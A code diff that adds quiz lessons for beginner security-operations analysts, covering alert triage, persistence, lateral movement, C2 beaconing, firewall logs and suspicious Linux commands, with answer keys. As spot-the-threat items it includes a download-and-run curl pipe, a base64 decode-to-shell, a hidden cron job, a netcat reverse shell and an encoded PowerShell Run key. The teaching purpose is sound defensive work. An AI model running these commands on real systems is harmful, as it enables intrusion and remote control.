@@ -148,4 +148,83 @@ export const LESSONS = [
     { type: "choice", q: "A secret was committed to a public repo and deleted the next day. Safe?", o: ["No: it's still in the history and still valid until rotated", "Yes, it was deleted", "Only if the repo has few stars"], a: 0, why: "History is attack surface. Rotate first, then clean up." },
     { type: "choice", q: "Which password should your blocklist reject?", o: ["Contoso2026!", "a random four-word passphrase", "a password-manager-generated string"], a: 0, why: "Company name plus year plus symbol is the first thing any automated attacker tries. Block seasons, months, years and the company name." },
   ] },
+
+  // ---- v5: for analysts in their first months ----
+  { id: "triage1", t: "Your first alert: a triage routine", topic: "SOC craft", steps: [
+    { type: "read", text: "Every alert gets the same five questions: what fired, on what asset and user, is the evidence real, how far does it go, and what do I decide. A routine stops you skipping steps when it's busy." },
+    { type: "order", prompt: "Put the triage routine in order.", items: ["Read the alert and the rule logic: what exactly fired?", "Add context: who is the user, what is the host, is it critical?", "Check the evidence: raw logs, process tree, the actual email or URL", "Scope it: same indicator on other hosts or users?", "Decide: close, monitor or escalate", "Write it up so the next person understands without asking"], why: "Context before conclusions. Most wrong closes come from skipping the context or the raw evidence." },
+    { type: "choice", q: "An alert says 'Mimikatz detected' on a server. The process tree shows it ran from the IT admin's tools folder during a scheduled pentest. What is it?", o: ["False positive", "Benign true positive: real activity, but expected and approved", "True positive: escalate as an incident"], a: 1, why: "The detection was right: Mimikatz really ran. It was approved, so it's a benign true positive. Note the pentest ticket in your close reason." },
+  ] },
+  { id: "tpfp", t: "True positive, false positive, benign", topic: "SOC craft", steps: [
+    { type: "match", prompt: "Match each outcome to what it means.", pairs: [["True positive", "The rule caught real malicious activity"], ["False positive", "The rule fired, but what it looked for didn't happen"], ["Benign true positive", "Real activity, but expected or approved"], ["False negative", "Something bad happened and nothing fired"]] },
+    { type: "choice", q: "Which one is the most dangerous for a SOC?", o: ["False positives", "False negatives", "Benign true positives"], a: 1, why: "False positives cost time. False negatives cost breaches, and you only find them by hunting or after the damage." },
+    { type: "choice", q: "A rule fires 200 times a day on the same backup server doing the same thing. Best fix?", o: ["Disable the rule", "Add a narrow exclusion for that server, process and account, and record why", "Close them all in bulk every morning"], a: 1, why: "Narrow exclusions keep the rule useful everywhere else. Bulk-closing trains people to ignore the alert." },
+  ] },
+  { id: "sevpri", t: "Severity vs priority", topic: "SOC craft", steps: [
+    { type: "read", text: "Severity is how bad the thing is. Priority is how soon you work on it. A medium alert on the domain controller can outrank a high alert on a test laptop." },
+    { type: "choice", q: "Which should you pick up first?", o: ["High: adware on a kiosk PC in reception", "Medium: new admin account created on a domain controller at 02:00", "Low: failed login on a user's laptop"], a: 1, why: "An unexpected domain admin account is a path to the whole domain. Asset value and blast radius drive priority." },
+    { type: "choice", q: "The CEO's mailbox gets a new forwarding rule to an outside address. Severity?", o: ["Low, it's just a mail rule", "High: classic sign of a compromised mailbox and possible BEC"], a: 1, why: "Forwarding rules to outside addresses are how attackers keep reading mail after a password reset." },
+  ] },
+  { id: "pyramid", t: "IOCs, IOAs and the Pyramid of Pain", topic: "Frameworks", steps: [
+    { type: "read", text: "An IOC (indicator of compromise) is evidence something happened: a hash, an IP, a domain. An IOA (indicator of attack) is behaviour: Word starting PowerShell. Behaviour is harder for attackers to change." },
+    { type: "order", prompt: "Order from easiest for an attacker to change to hardest (the Pyramid of Pain).", items: ["File hashes", "IP addresses", "Domain names", "Network and host artefacts", "Tools", "TTPs (tactics, techniques and procedures)"], why: "A new hash takes seconds. Changing how they operate takes weeks. Detections at the top of the pyramid hurt attackers most." },
+    { type: "choice", q: "Which detection survives the attacker recompiling their malware?", o: ["Block SHA-256 a3f5…", "Alert when Office apps spawn script interpreters", "Block one C2 IP"], a: 1, why: "It detects the behaviour, not the file." },
+  ] },
+  { id: "persist", t: "Where malware hides to survive a reboot", topic: "Endpoint", steps: [
+    { type: "read", text: "Persistence is how attackers come back after a reboot or a password reset. A handful of places cover most of it on Windows." },
+    { type: "spot", prompt: "Which entries look like persistence an attacker added?", lines: [
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  OneDrive = C:\\Users\\amy\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  Updater = powershell -w hidden -enc SQBFAFgA...",
+      "Scheduled task: \\Microsoft\\Windows\\Defrag\\ScheduledDefrag  defrag.exe -c",
+      "Scheduled task: \\GoogleUpdateTaskMachineQA  C:\\Users\\Public\\gup.exe every 5 minutes",
+      "Service: WinDefendUpdate  C:\\ProgramData\\svc\\winupd.exe (auto start)"], bad: [1, 3, 4], why: "Hidden encoded PowerShell, a binary in Users\\Public every five minutes, and a service in ProgramData with a security-sounding name. Real updaters live in Program Files and are signed." },
+    { type: "match", prompt: "Match the persistence spot to the event that records it.", pairs: [["Run key value set", "Sysmon 13"], ["Scheduled task created", "Security 4698"], ["Service installed", "System 7045"], ["New local account", "Security 4720"]] },
+  ] },
+  { id: "lateral", t: "Lateral movement fingerprints", topic: "Endpoint", steps: [
+    { type: "read", text: "Once inside, attackers move from machine to machine with admin tools. Each tool leaves a recognisable trail on the target." },
+    { type: "match", prompt: "Match the method to what you see on the target machine.", pairs: [["PsExec", "Service PSEXESVC installed (7045) and ADMIN$ share accessed"], ["WMI", "wmiprvse.exe spawning cmd.exe or powershell.exe"], ["WinRM / PowerShell remoting", "wsmprovhost.exe running commands"], ["RDP", "Logon type 10 (4624) and TerminalServices 1149"], ["Remote scheduled task", "4698 task created by a remote admin logon"]] },
+    { type: "choice", q: "A workstation suddenly logs on (type 3) to 40 other workstations in 10 minutes with the same admin account. What is it?", o: ["Normal user behaviour", "Likely lateral movement or ransomware staging", "Windows Update"], a: 1, why: "Workstations rarely talk to other workstations. One account fanning out fast is a classic spread pattern." },
+  ] },
+  { id: "phish5", t: "Phishing triage in five minutes", topic: "Phishing", steps: [
+    { type: "order", prompt: "A user reports a suspicious email. Put your steps in order.", items: ["Get the original as an attachment (.eml), not a forward", "Check the headers: SPF, DKIM, DMARC, Reply-To", "Unwrap and inspect links and attachments without opening them", "Search for other recipients of the same email", "Purge it from all inboxes and block the sender and URLs", "If anyone clicked or replied, reset and revoke their sessions"], why: "Scope before cleanup: you need the list of recipients before you purge, or you lose track of who got it." },
+    { type: "choice", q: "The user clicked but says they didn't type anything. Done?", o: ["Yes, nothing was entered", "No: check the device and proxy logs, and whether a download or an MFA prompt followed"], a: 1, why: "Drive-by downloads and token-stealing pages don't always need typing. Verify with logs, not memory." },
+  ] },
+  { id: "beacon", t: "Spot a C2 beacon in proxy logs", topic: "Network", steps: [
+    { type: "read", text: "Malware checks in with its command server on a schedule. Humans browse in bursts. Regular, small, repeated requests to one rare domain are the tell." },
+    { type: "spot", prompt: "Which host is beaconing?", lines: [
+      "10.1.4.22 → teams.microsoft.com  every few seconds, sizes vary a lot",
+      "10.1.7.31 → cdn-assets-sync.top  every 60s ±2s, 412 bytes each, 24 hours a day",
+      "10.1.2.10 → windowsupdate.com  a burst at 03:00, then nothing",
+      "10.1.9.40 → news.example.com  15 requests at lunch, none after"], bad: [1], why: "Fixed interval, fixed size, a rare domain on a cheap TLD, all night long. That's machine behaviour." },
+    { type: "choice", q: "Attackers add random delay (jitter) to beacons. What still gives them away?", o: ["Nothing, jitter hides it completely", "Long-running connections to a rare domain from one host, at all hours, with similar sizes"], a: 1, why: "Jitter blurs the timing but not the rarity, persistence and size patterns." },
+  ] },
+  { id: "fwlog", t: "Read a firewall log", topic: "Network", steps: [
+    { type: "spot", prompt: "Which lines deserve a closer look?", lines: [
+      "ALLOW TCP 10.1.3.5:52144 → 142.250.4.100:443 (workstation to Google)",
+      "DENY  TCP 203.0.113.9 → 10.1.0.0/16 ports 22,23,445,3389,5900 within 2 seconds",
+      "ALLOW TCP 10.1.8.12:49822 → 198.51.100.77:4444",
+      "ALLOW UDP 10.1.0.5:53 → 10.1.0.2:53 (internal DNS)",
+      "ALLOW UDP 10.20.4.15 → 8.8.8.8:53 from a database server"], bad: [1, 2, 4], why: "A port scan from outside, an internal host talking out on 4444 (Metasploit's default), and a server skipping internal DNS, which is how DNS tunnels and malware often look." },
+    { type: "choice", q: "Thousands of DENY lines from one outside IP. Incident?", o: ["Usually no: the firewall did its job. Note it, block if noisy, watch for any ALLOW from that IP", "Yes, always escalate blocked traffic"], a: 0, why: "Blocked scans are internet background noise. The ALLOW lines are where the risk is." },
+  ] },
+  { id: "hashes", t: "Hashes: what they prove and what they don't", topic: "Basics", steps: [
+    { type: "read", text: "A hash is a fingerprint of a file's exact bytes. Change one byte and the hash changes completely. It identifies a file; it says nothing about whether the file is good." },
+    { type: "choice", q: "Your download's SHA-256 matches the one on the vendor's site. What does that prove?", o: ["The file is safe", "The file is byte-for-byte what the vendor published", "The vendor wasn't hacked"], a: 1, why: "It proves integrity, not safety. If the vendor's site was compromised, both file and hash could be malicious." },
+    { type: "choice", q: "A hash isn't found on VirusTotal. What does that mean?", o: ["It's clean", "Nobody has submitted it yet. New or targeted malware is often unknown"], a: 1, why: "Absence of evidence isn't evidence of absence. Look at behaviour and where it came from." },
+    { type: "choice", q: "Should you upload a confidential company document to a public sandbox?", o: ["Yes, it's the fastest check", "No: search by hash first. Uploads can be downloaded by other users of the service"], a: 1, why: "Public sandboxes share samples. Search the hash; upload only files you'd be happy to publish, or use a private sandbox." },
+  ] },
+  { id: "linuxcmd", t: "Suspicious commands on Linux", topic: "Linux", steps: [
+    { type: "spot", prompt: "Which lines from a web server's bash history are bad news?", lines: [
+      "sudo systemctl restart nginx",
+      "curl -s http://203.0.113.5/x.sh | bash",
+      "tail -f /var/log/nginx/access.log",
+      "echo 'Y3VybCBldmlsLmNvbS9h' | base64 -d | sh",
+      "(crontab -l; echo '*/5 * * * * /tmp/.x/kworker') | crontab -",
+      "nc -e /bin/bash 198.51.100.4 9001"], bad: [1, 3, 4, 5], why: "Download-and-run, decode-and-run, a cron job running a hidden binary from /tmp named like a kernel thread, and a reverse shell." },
+    { type: "choice", q: "A process named [kworker/0:1] runs from /tmp/.x/. Normal?", o: ["Yes, kworker is a kernel thread", "No: real kernel threads have no file on disk. This is malware in disguise"], a: 1, why: "Kernel threads show in brackets and have no executable path. A file behind the name is a masquerade." },
+  ] },
+  { id: "ports", t: "Ports every analyst knows", topic: "Network", steps: [
+    { type: "match", prompt: "Match the port to the service.", pairs: [["22", "SSH"], ["53", "DNS"], ["88", "Kerberos"], ["445", "SMB"], ["3389", "RDP"], ["5985", "WinRM"], ["389", "LDAP"]] },
+    { type: "choice", q: "RDP (3389) open to the internet on a file server. Why does it matter?", o: ["It doesn't, RDP is encrypted", "It's one of the most common ransomware entry points: brute force and stolen passwords"], a: 1, why: "Put RDP behind a VPN or gateway with MFA. Never straight on the internet." },
+  ] },
 ];
